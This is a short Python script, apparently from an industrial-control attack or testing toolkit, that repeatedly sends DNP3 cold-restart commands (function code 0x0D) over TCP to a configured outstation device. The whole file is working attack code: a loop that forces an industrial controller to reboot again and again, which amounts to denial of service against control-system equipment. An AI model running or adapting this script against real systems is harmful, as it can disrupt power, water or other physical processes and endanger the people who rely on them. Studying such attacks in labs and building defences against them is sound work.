"""COLD_RESTART — FC 0x0D. Forces a full outstation cold reboot."""
import argparse, sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from dnp3 import app_request, send_tcp, now
from config import OUTSTATION_IP, OUTSTATION_PORT, OUTSTATION_ADDR, MASTER_ADDR

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default=OUTSTATION_IP)
    p.add_argument("--port", type=int, default=OUTSTATION_PORT)
    p.add_argument("--count", type=int, default=10)
    p.add_argument("--interval", type=float, default=2.0)
    a = p.parse_args()
    print(f"[{now()}] COLD_RESTART start x{a.count}")
    for i in range(a.count):
        send_tcp(app_request(MASTER_ADDR, OUTSTATION_ADDR, 0x0D, b"", seq=i & 0x0F),
                 a.host, a.port)
        time.sleep(a.interval)
    print(f"[{now()}] COLD_RESTART stop")

if __name__ == "__main__":
    main()
